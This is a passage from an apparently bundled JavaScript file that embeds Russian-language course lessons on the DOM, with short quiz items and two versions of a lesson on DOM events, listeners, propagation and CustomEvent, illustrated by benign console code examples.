**backgroundImage**◘◘\n\n~~~js\nvar btn = document.createElement('button')\nbtn.innerText = 'OK'\nbtn.style = `\n  background-image: url(https://cdn2.iconfinder.com/data/icons/user-23/512/User_Yuppie_2.png);\n  background-size: contain;\n  background-repeat: no-repeat;\n  background-position: left center;\n  padding: 5px 10px 5px 30px;\n`\ndocument.body.appendChild(btn)\n~~~\n\n_________________________________________\n\n## ![ico-30 hw] Tests\n\n◘◘** 1**◘◘\n~~~js\nvar elem = document.body\n  .appendChild(document.createElement('p'))\n\nelem.tagName = 'div'\n~~~\n\n→→→ Какой элемент появится в DOM? | p, div, 'будет сгенерировано исключение' | p→→→\n\n\n◘◘** 2**◘◘\n~~~js\ndocument.title = 'DOM'\n~~~\n\n→→→ Что изменится после выполнения скрипта? | 'ничего', 'текст на странице', 'надпись на вкладке' | надпись на вкладке→→→\n\n◘◘** 3**◘◘\n~~~js\nvar paragraph = [\n  'BOM',\n  'DOM',\n  'HTMLElement',\n  'Browser Object Model'\n]\n\nfor (var text of paragraph) {\n  document.body\n    .appendChild(document.createElement('p'))\n    .innerHTML = text\n}\n~~~\n\n→→→ Сколько элементов будет добавлено на страницу? | 0, 3, 1, 4 | 4→→→\n\n\n◘◘** 4**◘◘\n\n→→→ Какой тип данных у свойства innerHTML элемента DOM? | 'boolean', 'undefined', 'string', 'function', 'number', 'object' | string→→→\n\n\n◘◘** 5**◘◘\n~~~js\nfunction showProto (elem) {\n  var proto = elem.__proto__\n  var result = []\n  while (proto) {\n    result.push(proto.constructor.name)\n    proto = proto.__proto__\n  }\n  return { [elem.tagName]: result }\n}\n\nvar elems = ['p', 'img', 'a', 'div', 'input', 'style', 'script']\n\nelems.forEach(function (elem) {\n  console.log(showProto(document.createElement(elem)))\n})\n~~~\n\n→→→ Что итерирует функция showProto? | 'массив html-элементов', 'свойства html-элемента', 'цепочку прототипов html-элемента' | цепочку прототипов html-элемента→→→\n\n_________________________________\n\n[![ico-20 link] w3schools](external/w3-dom-elements)\n"},33441:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Document Object Model ( DOM )\n\n## ![ico-25 icon] События элементов DOM\n\nВ цепочке прототипов любого элемента DOM есть объект ( класс ) **~EventTarget~**\n\nБлагодаря этому все элементы DOM способны \"реагировать\" на события\n\nВыведем в консоль этот объект:\n\n~~~js\nconsole.dir(EventTarget)\n~~~\n\nБолее всего нас интересует, конечно, его свойство **_~prototype~_**\n\n~~~~console\n\n▼ ƒ EventTarget()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"EventTarget\"\n    ▼ prototype: EventTarget\n        ► addEventListener: ƒ addEventListener()\n        ► dispatchEvent: ƒ dispatchEvent()\n        ► removeEventListener: ƒ removeEventListener()\n        ► constructor: ƒ EventTarget()\n          Symbol(Symbol.toStringTag): \"EventTarget\"\n        ► __proto__: Object\n    ► __proto__: ƒ ()\n~~~~\n\nЗдесь мы видим три метода, которые унаследуют все объекты, имеющие в цепочке прототипов  **~EventTarget~**\n\n• addEventListener\n• removeEventListener\n• dispatchEvent\n\n^^Мы уже в курсе, что объект **~Node~** наследует от объекта **~EventTarget~**,^^\n^^а объект **~Element~** наследует от **~Node~**,^^\n^^потому что элементы DOM - это частный случай узла DOM^^\n\n^^В свойстве **_~prototype~_** объекта **~Element~** мы обнаружим не слишком длинный перечень свойств, начинающихся на **_~on~_**^^\n\n^^Однако объект **~Element~** является только прототипом объекта **~HTMLElement~**^^\n\n^^А вот последний как раз и является непосредственным прототипом всех элементов DOM^^\n\n^^Поэтому, очевидно, искать события, общие для всех элементов DOM, нужно именно в его свойстве **_~prototype~_**^^\n\n~~~js\nfor (var prop in HTMLElement.prototype) {\n  if (prop.indexOf('on') !== 0) continue\n  console.info(`Event: ${prop.slice(2)}`)\n}\n~~~\n\n^^Однако элементы DOM значительно отличаются друг от друга^^\n\n^^У каждого html-элемента есть собственный конструктор, который \"добавляет\" специфические\" для этого элемента события^^\n\n^^( например, события **~input~** и **~change~** могут произойти только на элементах форм )^^\n\n\n<img src=\"https://github.com/garevna/js-course/blob/master/pictures/event-1.png?raw=true\" width=\"300\"/>\n\n__________________________________________________________________\n\n![ico-25 cap] **DOMNodeInserted**\n\n~~~js\ndocument.body.ondomnodeinserted = function (event) {\n  console.log(event)\n}\n\ndocument.body.appendChild(document.createElement('div'))\n~~~\n\n**Результат:**\n\n~~~~console\n\n▼ MutationEvent {isTrusted: true, relatedNode: body, prevValue: \"\", newValue: \"\", attrName: \"\", …}\n    attrChange: 0\n    attrName: \"\"\n    bubbles: true\n    cancelBubble: false\n    cancelable: false\n    composed: false\n    currentTarget: null\n    defaultPrevented: false\n    eventPhase: 0\n    isTrusted: true\n    newValue: \"\"\n  ► path: (5) [div, body, html, document, Window]\n    prevValue: \"\"\n  ► relatedNode: body\n    returnValue: true\n  ► srcElement: div\n  ► target: div\n    timeStamp: 12720.100000005914\n    type: \"DOMNodeInserted\"\n  ► __proto__: MutationEvent\n~~~~\n\n______________________________________________________\n\n![ico-20 warn] Событие - это объект ![ico-20 smile]\n\nкаждое событие создается конструктором **~Event~**\n\nУ каждого события есть свойство  **_~type~_** (строка):\n\n^^^[event type]\n\n![ico-20 green-ok] click\n![ico-20 green-ok] mouseover\n![ico-20 green-ok] mouseout\n![ico-20 green-ok] mouseenter\n![ico-20 green-ok] mouseleave\n![ico-20 green-ok] mousedown\n![ico-20 green-ok] mouseup\n![ico-20 green-ok] keydown\n![ico-20 green-ok] keyup\n**...**\n\n^^^\n\nВ примере выше тип события - ~DOMNodeInserted~\n\nКроме того, у каждого объекта события есть свойство ~target~, которое является ссылкой на элемент, на котором произошло событие\n\nВ большинстве случаев это тот элемент, на который был \"повешен\" обработчик\n\n![ico-20 warn] Однако в примере выше обработчик был повешен на элемент ~body~, а свойство ~target~ указывает на добавленный в DOM элемент\n\nВ следующем примере свойство ~target~ будет ссылкой на тот элемент, на котором произошел клик\nКлик на пустом контейнере ( элементе div ) добавляет в контейнер картинку\nпри этом свойство **target** объекта события показывает на элемент-контейнер\nПри клике на картинке свойство **target** объекта события показывает на элемент img\nа элемент-контейнер получит это событие уже на всплытии, когда свойство **eventPhase** объекта события будет иметь значение 3\n\nОбратите внимание, что мы назначаем всего 1 колбэк - обработчик события **click** элемента-контейнера\nНам не нужно устанавливать дополнительно обработчика события **click** элемента img\n\n◘◘![ico-25 cap] target & eventPhase◘◘\n\n~~~js\nvar pictures = [\n  'https://www.insidescience.org/sites/default/files/5_heic1808a_crop.jpg',\n  'https://gobelmont.ca/Portals/0/xBlog/uploads/2017/9/6/dancing-156041_960_720.png',\n  'https://i2-prod.mirror.co.uk/incoming/article11840943.ece/ALTERNATES/s615/PAY-MATING-BUGS.jpg',\n  'https://i.redd.it/otqqqga0ip211.jpg'\n]\n\nvar divs = pictures.map(picture => {\n  var div = document.body\n    .appendChild(document.createElement('div'))\n    div.style = `\n      width: 200px;\n      height: 100px;\n      border: solid 1px gray;\n    `\n    div.onclick = function (event) {\n      if (event.eventPhase === 3) this.firstChild.remove()\n      else {\n        var img = event.target\n          .appendChild(document.createElement('img'))\n        img.src = picture\n        img.width = 200\n      }\n    }\n    return div\n})\n\n~~~\n\n{{{DOM-events-1.js}}}\n\n_________________________________\n\nПолный перечень событий DOM можно найти в спецификации:\n\n[%%%DOM event%%%](https://www.w3schools.com/jsref/dom_obj_event.asp)\n[%%%JS event%%%](https://www.w3schools.com/js/js_events.asp)\n\n_________________________________________\n\n## ![ico-25 icon] host-объект Event\n\nКонструктор, с помощью которого создаются все события DOM\n\nСвойство  **_~prototype~_**  конструктора **~Event~** содержит свойства, которые будут унаследованы всеми событиями\n\n~~~js\nvar userEvent = new Event( 'user' )\n~~~\n\n___________________________________\n\n## ![ico-25 icon] dispatchEvent\n\nМетод **dispatchEvent** вызывает событие на элементе\n\n◘◘![ico-25 cap] **dispatchEvent**◘◘\n\n~~~js\ndocument.body.onclick = function (event) {\n  this.style.backgroundColor = '#fa0'\n}\ndocument.body.dispatchEvent(new Event('click'))\n~~~\n\n_________________________________\n\n## ![ico-25 icon] CustomEvent\n\nКонструктор **CustomEvent** создает кастомное событие c дополнительными параметрами\n\n◘◘![ico-25 cap] **CustomEvent**◘◘\n\n~~~js\nfunction addElement (tagName, container) {\n  var _container = container && container.nodeType === 1\n    ? container\n    : document.body\n  return _container.appendChild(document.createElement(tagName))\n}\n\nvar obj = addElement('h1')\n\nobj.innerText = 'Hi'\n\nobj.addEventListener('listen', listenHandler)\n\nfunction listenHandler (event) {\n  this.innerText = event.detail\n}\n\nvar btn = addElement('button')\nbtn.innerText = 'Change'\n\nbtn.onclick = function (event) {\n  var inp = addElement('input')\n  inp.onchange = function (event) {\n    obj.dispatchEvent(new CustomEvent('listen', {\n      detail: this.value\n    }))\n\n    this.parentNode.removeChild(this)\n  }\n}\n~~~\n\n______________________________________\n\n## ![ico-25 icon] event handler\n\nУ всех элементов есть свойства с именами, начинающимися с  \"**_on_**\"\n\nЗначения этих свойств должны быть ссылкой на callback-функцию, которая будет вызвана при возникновении события ( _event handler_ )\n\nОбработчик события - это функция, которая вызывается тогда, когда событие произошло\n\nЕсли определить значение свойства  **_~onclick~_**  элемента как функцию **_clickCallback_**, то в момент, когда пользователь кликнет левой кнопкой мышки на этом элементе, будет вызвана функция **_clickCallback_**\n\nФункция  **_clickCallback_** станет обработчиком события  **~click~**  элемента\n\n![ico-20 warn] Обработчики события в момент их вызова получают в качестве первого аргумента **объект события**\n\n^^Поэтому при объявлении функции-обработчика настоятельно рекомендуется в качестве первого параметра указывать имя переменной, в которую будет помещена ссылка на объект события:^^\n\n~~~js\nelem.onclick = function (event) { ... }\nelem.onmouseover = function (ev) { ... }\n~~~\n\nТаким образом объект события становится доступным внутри обработчика\n\n_________________________________________\n\n### ![ico-20 icon] event.screenX &#124; event.screenY\n\nКоординаты указателя мышки относительно левого верхнего угла физического экрана\n\n_________________________________________________\n\n### ![ico-20 icon] event.clientX &#124; event.clientY\n\nКоординаты указателя мышки относительно верхнего левого края видимой части окна браузера\n( **_viewport_** )\n\n[:::Пример:::](https://codepen.io/garevna/pen/jLbaMg)\n\nЭти координаты не зависят от положения полосы прокрутки окна браузера\n\n_______________________________\n\n### ![ico-20 icon] event.pageX &#124; event.pageY\n\nКоординаты указателя мышки относительно верхнего левого края страницы\n\nЭти координаты зависят от положения полосы прокрутки окна браузера\n\n_________________________\n\n### ![ico-20 icon] eventPhase\n\n[:::eventPhase:::](https://jsfiddle.net/garevna/1cL6nk8j/4/)\n\n____________________________\n\n## ![ico-25 icon] eventListener\n\n<img src=\"https://github.com/garevna/js-course/blob/master/pictures/event-2.png?raw=true\" width=\"400\"/>\n\nМетоды добавления и удаления прослушивателей событий:\n\n![ico-20 green-ok] addEventListener\n![ico-20 green-ok] removeEventListener\n\nСвойства \"on...\" позволяют \"повесить\" только одного обработчика данного события на данный элемент\n\neventListener-ов может быть сколько угодно для одного и того же элемента и одного и того же события\n\nПредположим, мы вешаем обработчика события mousemove на все элементы **div**\n\nЗатем вешаем \"персонального\" обработчика события **_~mousemove~_** на  **~div#sample~**\n\nНа  элементе  **~div#sample~**  \"сработают\" оба обработчика при наведении указателя мышки\n\n_________________________________________________________________\n\n## ![ico-25 icon] addEventListener\n\nПервый аргумент метода addEventListener - это тип события ( строка ), например:\n^^• mouseover<br>• mouseout<br>• input<br>• change<br>**...**^^\n\nВторой аргумент - ссылка на функцию ( обработчика события )\n\n_______________________\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\ndocument.getElementById('sample')\n  .addEventListener('click', function (event) {\n    console.log('sample click event:\\n', event)\n  })\n~~~\n\n______________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar elem = document.body\n  .appendChild(document.createElement('p'))\n\nelem.innerText = 'Hello'\n\nfunction clickdHandler (event) {\n  this.innerHTML = `\n    <small>\n      My content was changed!\n    </small>\n  `\n}\nelem.addEventListener('click', clickdHandler)\n~~~\n\nТретий аргумент - логическое значение - будучи установленным в **~true~**, позволяет перехватить событие на фазу погружения ( **_capturing_** )\n\n_____________________________\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar btn = document.createElement('button')\nbtn.innerText = 'OK'\nbtn.style = `\n  background-image: url(https://cdn2.iconfinder.com/data/icons/user-23/512/User_Yuppie_2.png);\n  background-size: contain;\n  background-repeat: no-repeat;\n  background-position: left center;\n  padding: 5px 10px 5px 30px;\n`\ndocument.body.appendChild(btn)\n\nvar callback = event => console.log(`target: ${event.currentTarget.tagName} eventPhase: ${event.eventPhase}`)\n\nbtn.addEventListener('click', callback, true)\n\ndocument.body.addEventListener('click', callback, true)\n~~~\n\n{{{DOM-events-2.js}}}\n\n_________________________________________________\n\n### ![ico-20 icon] preventDefault()\n\nИногда мы не хотим, чтобы при наступлении события элемент HTML вел себя так, как он должен себя вести по умолчанию\n\nВ таком случае мы можем использовать метод **~preventDefault()~**\n\nНапример, по умолчанию в результате клика на гиперссылке происходит переход по адресу, указанному атрибутом *href*\n\nМы можем внутри обработчика события **_~click~_** элемента **~ a~** вызвать метод **_~preventDefault()~_**, что предотвратит поведение по умолчанию, и перехода не будет\n\n_______________________\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nvar elem = document.body\n  .appendChild(document.createElement('a'))\n\nelem.innerText = 'click me'\n\nelem.href = 'https://www.w3schools.com/charsets/ref_utf_punctuation.asp'\n\nelem.addEventListener('click', function (event) {\n  event.preventDefault()\n  alert(`href: ${this.href}`)\n})\n~~~\n\n___________________________________\n\n### ![ico-20 icon] stopPropagation()\n\nПредотвращает \"всплытие\" события, т.е. срабатывание обработчиков этого события на элементах, внутри которых находится целевой элемент\n\nПочти все события \"всплывают\" ( но не все, например, событие **_focus_** не всплывает )\n\n__________________\n\nЗапустите код в консоли, кликните на самом маленьком кружке и посмотрите, что будет выведено в консоль\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~~js\nvar elemData = {\n   name: 'div',\n   attrs: {\n     className: 'container',\n     title: 'Контейнер',\n     style: `\n       position: absolute;\n       top: 20px;\n       left: 20px;\n       border-radius: 50%;\n       border: dotted 2px #789;\n       background-color: #70ff9090;\n     `\n   }\n}\n\nfunction clickHandler (event) {\n  // event.stopPropagation()\n  console.info(this.num)\n}\n\nfunction insertElement (elemNum, parentElem = document.body) {\n   var elem = parentElem\n     .appendChild(document.createElement(elemData.name))\n   elem.num = elemNum\n\n   for (var attr in elemData.attrs) {\n     elem[attr] = elemData.attrs[attr]\n   }\n\n   elem.style.width = `${400 - elemNum * 50}px`\n   elem.style.height = `${400 - elemNum * 50}px`\n\n   elem.addEventListener('click', clickHandler)\n\n   return elem\n}\n\nvar elems = []\nelems [0] = insertElement(0)\nfor ( var x = 1; x < 5; x++ ) {\n  elems [x] = insertElement(x, elems[x - 1])\n}\n~~~~\n\nТеперь перезагрузите страницу, опять вставьте код, но раскомментируйте строку\n\n~~~js\nevent.stopPropagation()\n~~~\n\nкликните на самом маленьком кружке и посмотрите, что будет выведено в консоль\n\n____________________________________\n\n### ![ico-20 icon] stopImmediatePropagation()\n\nЕсли у элемента есть несколько прослушивателей одного и того же события, они будут вызваны в том порядке, в котором они были добавлены\n\nЕсли один из обработчиков, установленных одним из этих listener-ов, вызовет метод **~event.stopImmediatePropagation()~**, то остальные listener-ы, следующие за ним, уже не сработают\n\n_______________________\n\nЕсли выполнить следующий код в консоли:\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~~js\nvar elem = document.body\n  .appendChild(document.createElement('p'))\n\nelem.innerHTML = 'Click me, please'\n\nvar text = [\n  'Я тут первый, остальные на фиг!',\n  'Hello',\n  'are you happy?',\n  'what is your favorite language?',\n  'Bye'\n]\n\nfor (var txt of text) {\n  elem.addEventListener('click', (function (message) {\n    return function () {\n      // event.stopImmediatePropagation()\n      elem.innerHTML += `<br />${message}`\n    }\n  })(txt))\n}\n~~~~\n\nто при клике на элементе сработают все прослушиватели собятия ~click~ элемента в той последовательности, в какой мы их определили\n\nОднако если убрать слеши перед строчкой\n\n~~~js\nevent.stopImmediatePropagation()\n~~~\n\nто сработает только один прослушиватель, и выведена в консоль будет только одна строчка\n\n____________________________________________\n\n## ![ico-25 icon] removeEventListener\n\nПрослушивателей событий желательно удалять перед удалением элемента\n\n^^Раньше прослушиватели удаленных элементов были причиной утечек памяти ( memory leaks ), поскольку Internet Explorer не умел обнаруживать такие ссылки^^\n^^каждый раз, когда наблюдатель добавлялся к элементу в IE, это приводило к утечке памяти^^\n^^По этой причине стало нормальной практикой явно удалять обработчиков перед удалением элементов или обнулять ссылки внутри наблюдателей^^\n\nПри удалении прослушивателя нужно передавать точно такие же аргументы, какие были переданы методу addEventListener при его создании\n\n^^В настоящее время современные браузеры ( включая IE и Microsoft Edge ) используют современные алгоритмы сбора мусора,^^\n^^которые могут обнаруживать таких прослушивателей событий для удаленных элементов^^\n^^Так что теперь не обязательно вызывать removeEventListener перед удалением элемента^^\n\n___________________\n\nТакой вариант удаления не сработает:\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\ndocument.getElementById('sample')\n  .addEventListener('click', function (event) {\n    console.log('sample click event:\\n', event)\n  })\n\ndocument.getElementById('sample')\n  .removeEventListener('click', function (event) {\n    console.log('sample click event: ', event)\n  })\n~~~\n\n___________________________________\n\nА такой - да:\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nfunction clickHandler (event) {\n  this.innerHTML = '<small>My content was changed!</small>'\n}\nelem.addEventListener('click', clickHandler)\nelem.removeEventListener('click', clickHandler)\n~~~\n\n_________________________\n\n![ico-25 cap] ** 9**\n\n^^^[Разметка]\n\n~~~html\n<div id=\"main-frame\" class=\"wrapper\">\n  <div id=\"main-content\">\n    <div id=\"main-message\">\n      <h1>Event Listener</h1>\n      <p>Тестируем работу eventListener</p>\n      <div id=\"list\">\n         <p>Что нужно помнить:</p>\n         <ul class=\"single\">\n            <li>eventListener-ов нужно удалять</li>\n            <li>Для этого есть метод removeEventListener</li>\n         </ul>\n      </div>\n      <div class=\"error\">Error was detected</div>\n      <div id=\"diagnose\">Печалька</div>\n    </div>\n  </div>\n</div>\n\n<div id=\"error\">\n  <p id=\"details\">____________________</p>\n</div>\n~~~\n\n^^^\n\n^^^[Скрипт]\n\n~~~js\nvar collection = document.querySelectorAll('p &#126; *')\n\ncollection.forEach(x => {\n  if (x.nodeType === 1) {\n    x.addEventListener('mouseover', function (event) {\n      var message = event.target.tagName + event.target.id\n        ? '#' + event.target.id\n        : event.target.className\n          ? '.' + event.target.className\n          : ' content: ' + event.target.innerHTML\n\n      console.warn(message)\n    })\n  }\n})\n\nvar elem = document.querySelector('#list')\nelem.addEventListener('mouseover', function (event) {\n  event.target.innerHTML = `event: ${new Date().toLocaleString()}`\n})\n\nfunction clickHandler (event) {\n  this.innerHTML = '<small>My content was changed!</small>'\n}\n\nelem.addEventListener('click', clickHandler)\n~~~\n\n^^^\n\n_______________________________________________________\n\nОбратите внимание, что элемент в следущем примере создается только один раз\nПри удалении элемента ссылка на него сохраняется в переменной **elem**\nвместе со свойствами **onclick**, **onmouseover** и **onmouseout**,\nа при повторной вставке элемента в DOM все обработчики событий продолжают работать так же, как и до удаления \n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nvar elem = null\n\nfunction bodyClickHandler (event) {\n  if (elem) document.body.appendChild(elem)\n  else {\n    elem = document.body\n      .appendChild(document.createElement('div'))\n\n    elem.style = `\n      padding: 20px;\n      border: 2px solid #09b;\n    `\n    elem.onclick = function (event) {\n      event.stopPropagation()\n      elem = event.target.parentNode.removeChild(event.target)\n      document.body.onclick = bodyClickHandler\n    }\n\n    elem.onmouseover = function (event) {\n      event.target.style.borderColor = '#f50'\n      event.target.innerText = 'Welcome!'\n    }\n    elem.onmouseout = function ( event ) {\n      event.target.style.borderColor = '#09b'\n      event.target.innerText = 'Bye!'\n    }\n  }\n  document.body.onclick = null\n}\n\ndocument.body.onclick = bodyClickHandler\n~~~\n\n{{{DOM-events.js}}}\n\n____________________________________________________________\n\nПримеры в песочнице:\n\n[:::mouseover & mouseout:::](https://codepen.io/garevna/pen/jLrReP?editors=1010)\n\n[:::mouseenter & mouseleave:::](https://codepen.io/garevna/pen/gxaOXq)\n\n[:::onscroll &#124; onwheel:::](https://jsfiddle.net/garevna/ayoLy5eL/1/)\n\n[:::keypress vs keydown:::](https://codepen.io/garevna/pen/PKPQVR)\n\n[:::dispatchEvent:::](https://codepen.io/garevna/pen/gxpQvy)\n\n_____________________________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLSdeCCJVXykUJdr9gIroRT1H4K2JD6bhSreAs_tvsLd9vaNReQ/viewform)\n\n___________________________\n\n[%%%W3S%%% ](https://www.w3schools.com/js/js_htmldom_eventlistener.asp)\n"},87244:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Document Object Model (DOM)\n\n## ![ico-25 icon] События элементов DOM\n\n@@@@\n\n<br><br>В цепочке прототипов любого элемента DOM есть объект (класс) **~EventTarget~**.<br>Благодаря этому все элементы DOM способны \"реагировать\" на события.<br><br><br>Выведем в консоль этот объект:\n![](images/object-constructor.svg)\n\n@@@@\n\n~~~js\nconsole.dir(EventTarget)\n~~~\n\nБолее всего нас интересует, конечно, его свойство **_~prototype~_**\n\n~~~~console\n\n▼ ƒ EventTarget()\n    arguments: null\n    caller: null\n    length: 0\n    name: \"EventTarget\"\n    ▼ prototype: EventTarget\n        ► addEventListener: ƒ addEventListener()\n        ► dispatchEvent: ƒ dispatchEvent()\n        ► removeEventListener: ƒ removeEventListener()\n        ► constructor: ƒ EventTarget()\n          Symbol(Symbol.toStringTag): \"EventTarget\"\n        ► __proto__: Object\n    ► __proto__: ƒ ()\n~~~~\n\nЗдесь мы видим три метода, которые унаследуют все объекты, имеющие в цепочке прототипов  **~EventTarget~**\n\n• addEventListener\n• removeEventListener\n• dispatchEvent\n\n^^Мы уже в курсе, что объект **~Node~** наследует от объекта **~EventTarget~**,^^\n^^а объект **~Element~** наследует от **~Node~**,^^\n^^потому что элементы DOM - это частный случай узла DOM^^\n\n^^В свойстве **_~prototype~_** объекта **~Element~** мы обнаружим не слишком длинный перечень свойств, начинающихся на **_~on~_**^^\n\n^^Однако объект **~Element~** является только прототипом объекта **~HTMLElement~**^^\n\n^^А вот последний как раз и является непосредственным прототипом всех элементов DOM^^\n\n^^Поэтому, очевидно, искать события, общие для всех элементов DOM, нужно именно в его свойстве **_~prototype~_**^^\n\n~~~js\nfor (var prop in HTMLElement.prototype) {\n  if (prop.indexOf('on') !== 0) continue\n  console.info(`Event: ${prop.slice(2)}`)\n}\n~~~\n\n^^Однако элементы DOM значительно отличаются друг от друга^^\n\n^^У каждого html-элемента есть собственный конструктор, который \"добавляет\" специфические\" для этого элемента события^^\n\n^^(например, события **~input~** и **~change~** могут произойти только на элементах форм)^^\n\n__________________________________________________________________\n\n![ico-25 cap] **DOMNodeInserted**\n\n~~~js\ndocument.body.ondomnodeinserted = function (event) {\n  console.log(event)\n}\n\ndocument.body.appendChild(document.createElement('div'))\n~~~\n\n**Результат:**\n\n~~~~console\n\n▼ MutationEvent {isTrusted: true, relatedNode: body, prevValue: \"\", newValue: \"\", attrName: \"\", …}\n    attrChange: 0\n    attrName: \"\"\n    bubbles: true\n    cancelBubble: false\n    cancelable: false\n    composed: false\n    currentTarget: null\n    defaultPrevented: false\n    eventPhase: 0\n    isTrusted: true\n    newValue: \"\"\n  ► path: (5) [div, body, html, document, Window]\n    prevValue: \"\"\n  ► relatedNode: body\n    returnValue: true\n  ► srcElement: div\n  ► target: div\n    timeStamp: 12720.100000005914\n    type: \"DOMNodeInserted\"\n  ► __proto__: MutationEvent\n~~~~\n\n______________________________________________________\n\n![ico-20 warn] Событие - это объект ![ico-20 smile]\n\nкаждое событие создается конструктором **~Event~**\n\nУ каждого события есть свойство  **_~type~_** (строка):\n\n^^^[event type]\n\n^^![ico-20 green-ok] click^^\n^^![ico-20 green-ok] mouseover^^\n^^![ico-20 green-ok] mouseout^^\n^^![ico-20 green-ok] mouseenter^^\n^^![ico-20 green-ok] mouseleave^^\n^^![ico-20 green-ok] mousedown^^\n^^![ico-20 green-ok] mouseup^^\n^^![ico-20 green-ok] keydown^^\n^^![ico-20 green-ok] keyup^^\n^^![ico-20 green-ok] scroll^^\n^^![ico-20 green-ok] scroll^^\n**...**\n\n^^^\n\nВ примере выше тип события - ~DOMNodeInserted~\n\n![](illustrations/event-1.png)\nКроме того, у каждого объекта события есть свойство ~target~, которое является ссылкой на элемент, на котором произошло событие\n\nВ большинстве случаев это тот элемент, на который был \"повешен\" обработчик\n\n![ico-20 warn] Однако в примере выше обработчик был повешен на элемент ~body~, а свойство ~target~ указывает на добавленный в DOM элемент\n\n________________________\n\nВ следующем примере свойство ~target~ будет ссылкой на тот элемент, на котором произошел клик\nКлик на пустом контейнере ( элементе div ) добавляет в контейнер картинку\nпри этом свойство **target** объекта события показывает на элемент-контейнер\nПри клике на картинке свойство **target** объекта события показывает на элемент img\nа элемент-контейнер получит это событие уже на всплытии, когда свойство **eventPhase** объекта события будет иметь значение 3\n\nОбратите внимание, что мы назначаем всего 1 колбэк - обработчик события **click** элемента-контейнера\nНам не нужно устанавливать дополнительно обработчика события **click** элемента img\n\n◘◘![ico-25 cap] target & eventPhase◘◘\n\n~~~js\nvar pictures = [\n  'https://www.insidescience.org/sites/default/files/5_heic1808a_crop.jpg',\n  'https://gobelmont.ca/Portals/0/xBlog/uploads/2017/9/6/dancing-156041_960_720.png',\n  'https://i2-prod.mirror.co.uk/incoming/article11840943.ece/ALTERNATES/s615/PAY-MATING-BUGS.jpg',\n  'https://i.redd.it/otqqqga0ip211.jpg'\n]\n\nvar divs = pictures.map(picture => {\n  var div = document.body\n    .appendChild(document.createElement('div'))\n    div.style = `\n      width: 200px;\n      height: 100px;\n      border: solid 1px gray;\n    `\n    div.onclick = function (event) {\n      if (event.eventPhase === 3) this.firstChild.remove()\n      else {\n        var img = event.target\n          .appendChild(document.createElement('img'))\n        img.src = picture\n        img.width = 200\n      }\n    }\n    return div\n})\n\n~~~\n\n{{{DOM-events-1.js}}}\n\n_________________________________\n\nПолный перечень событий DOM можно найти в спецификации:\n\n[HTML DOM Events](external/mdn-dom-events)\n[JavaScript Events](external/w3-dom-events)\n\n_________________________________________\n\n## ![ico-25 icon] host-объект Event\n\nКонструктор, с помощью которого создаются все события DOM\n\nСвойство  **_~prototype~_**  конструктора **~Event~** содержит свойства, которые будут унаследованы всеми событиями\n\n~~~js\nvar userEvent = new Event('user')\n~~~\n\n___________________________________\n\n## ![ico-25 icon] dispatchEvent\n\nМетод **dispatchEvent** вызывает событие на элементе\n\n◘◘![ico-25 cap] **dispatchEvent**◘◘\n\n~~~js\ndocument.body.onclick = function (event) {\n  this.style.backgroundColor = '#fa0'\n}\ndocument.body.dispatchEvent(new Event('click'))\n~~~\n\n_________________________________\n\n## ![ico-25 icon] CustomEvent\n\nКонструктор **CustomEvent** создает кастомное событие c дополнительными параметрами\n\n◘◘![ico-25 cap] **CustomEvent**◘◘\n\n~~~js\nfunction addElement (tagName, container) {\n  var _container = container && container.nodeType === 1\n    ? container\n    : document.body\n  return _container.appendChild(document.createElement(tagName))\n}\n\nvar obj = addElement('h1')\n\nobj.innerText = 'Hi'\n\nobj.addEventListener('listen', listenHandler)\n\nfunction listenHandler (event) {\n  this.innerText = event.detail\n}\n\nvar btn = addElement('button')\nbtn.innerText = 'Change'\n\nbtn.onclick = function (event) {\n  var inp = addElement('input')\n  inp.onchange = function (event) {\n    obj.dispatchEvent(new CustomEvent('listen', {\n      detail: this.value\n    }))\n\n    this.parentNode.removeChild(this)\n  }\n}\n~~~\n\n______________________________________\n\n## ![ico-25 icon] event handler\n\nУ всех элементов есть свойства с именами, начинающимися с  \"**_on_**\"\n\nЗначения этих свойств должны быть ссылкой на callback-функцию, которая будет вызвана при возникновении события ( _event handler_ )\n\nОбработчик события - это функция, которая вызывается тогда, когда событие произошло\n\nЕсли определить значение свойства  **_~onclick~_**  элемента как функцию **_clickCallback_**, то в момент, когда пользователь кликнет левой кнопкой мышки на этом элементе, будет вызвана функция **_clickCallback_**\n\nФункция  **_clickCallback_** станет обработчиком события  **~click~**  элемента\n\n![ico-20 warn] Обработчики события в момент их вызова получают в качестве первого аргумента **объект события**\n\n^^Поэтому при объявлении функции-обработчика настоятельно рекомендуется в качестве первого параметра указывать имя переменной, в которую будет помещена ссылка на объект события:^^\n\n~~~js\nelem.onclick = function (event) { ... }\nelem.onmouseover = function (ev) { ... }\n~~~\n\nТаким образом объект события становится доступным внутри обработчика\n\n_________________________________________\n\n### ![ico-20 icon] event.screenX &#124; event.screenY\n\nКоординаты указателя мышки относительно левого верхнего угла физического экрана\n\n_________________________________________________\n\n### ![ico-20 icon] event.clientX &#124; event.clientY\n\nКоординаты указателя мышки относительно верхнего левого края видимой части окна браузера (**~viewport~**)\n\n[:::clientX | clientY:::](external/clientX-clientY)\n\nЭти координаты не зависят от положения полосы прокрутки окна браузера\n\n_______________________________\n\n### ![ico-20 icon] event.pageX &#124; event.pageY\n\nКоординаты указателя мышки относительно верхнего левого края страницы\n\nЭти координаты зависят от положения полосы прокрутки окна браузера\n\n_________________________\n\n### ![ico-20 icon] eventPhase\n\n[:::eventPhase:::](external/event-phase)\n\n____________________________\n\n## ![ico-25 icon] eventListener\n\nЭтот сервис браузерного API позволяет повесить на одно и то же событие одного и того же элемента несколько коллбеков.\nДля этой цели создается \"посредник\" между событием элемента и коллбеком.\nКаждый \"посредник\" как бы \"прослушивает\" событие 